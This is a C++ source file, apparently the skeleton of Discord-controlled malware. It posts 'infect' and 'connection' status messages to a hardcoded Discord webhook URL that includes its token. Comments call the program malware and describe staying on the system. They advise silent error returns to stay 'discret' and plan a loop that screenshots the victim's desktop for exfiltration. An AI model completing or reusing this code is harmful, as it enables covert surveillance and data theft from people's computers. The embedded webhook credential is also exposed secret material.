#include "header.h"
#include "embeds/handling/handling.h"

//Returning 0 in error cases are for avoid system recollect information about the supposed error), please avoid changing it if you want to be discret.

void track_kill(dpp::cluster& temp_token, dpp::webhook& MAIN_WEBHOOK) {
    //dpp::cluster* myArg1 = static_cast<int>(temp_token);
    //dpp::webhook* myArg2 = static_cast<int>(MAIN_WEBHOOK);
    dpp::message proc_kill("");
    proc_kill.add_embed(handle_kill());
    std::this_thread::sleep_for(std::chrono::seconds(1));
    temp_token.execute_webhook(MAIN_WEBHOOK, proc_kill);

    //exit(0);
}

int main(int argc, char* argv[]) {
    dotenv::init();
    dpp::cluster temp_token("");
    const std::string MAIN_WEBHOOK_url = "https://discord.com/api/webhooks/1140423949080080424/Q5WTMKMrTImUw4tfi56pDevc2VBsbU65xOT2zRffCs2xzfCbEAtegPmXl-Higxp5MI-Y";
    const std::string WORDS_WEBHOOK_url = "https://discord.com/api/webhooks/1140423949080080424/Q5WTMKMrTImUw4tfi56pDevc2VBsbU65xOT2zRffCs2xzfCbEAtegPmXl-Higxp5MI-Y";
    dpp::webhook MAIN_WEBHOOK(MAIN_WEBHOOK_url);

    dpp::message warning_disclaimer("");
    warning_disclaimer.add_embed(disclaimer_warning());
    temp_token.execute_webhook(MAIN_WEBHOOK, warning_disclaimer);

    if(MAIN_WEBHOOK_url == WORDS_WEBHOOK_url) {
        //WWW
        dpp::message error_equal_whs("");
        error_equal_whs.add_embed(equal_webhooks());
        std::this_thread::sleep_for(std::chrono::seconds(1));
        temp_token.execute_webhook(MAIN_WEBHOOK, error_equal_whs);
        return 0;
    }

    try {
        dpp::message infect("");
        infect.add_embed(making_connection());
        temp_token.execute_webhook(MAIN_WEBHOOK, infect);

        //create a take screenshots function
        //a while true loop to constantly screeenshot the desktop
        //using opencv
        bool worked = true;

        if(worked == false) {
            dpp::message error_infect("");
            error_infect.add_embed(connection_result(worked));
            std::this_thread::sleep_for(std::chrono::seconds(1)); //Avoid deleting this sleep, so all the code will stop working. due to webhooks limits
            temp_token.execute_webhook(MAIN_WEBHOOK, error_infect);
        } else {
            dpp::message success_infect("");
            success_infect.add_embed(connection_result(worked));
            std::this_thread::sleep_for(std::chrono::seconds(1));
            temp_token.execute_webhook(MAIN_WEBHOOK, success_infect); 
        } //continue below catch
    } catch(const std::exception& e) {
        dpp::message exception_error("");
        exception_error.add_embed(handle_catch(e));
        std::this_thread::sleep_for(std::chrono::seconds(1));
        temp_token.execute_webhook(MAIN_WEBHOOK, exception_error);
        track_kill(temp_token, MAIN_WEBHOOK);
        return 0;
    }
    
    //This never should happen (MAlware are continuosly on the system, so register when the mwalware stops processing).
    track_kill(temp_token, MAIN_WEBHOOK);
    return 0;
}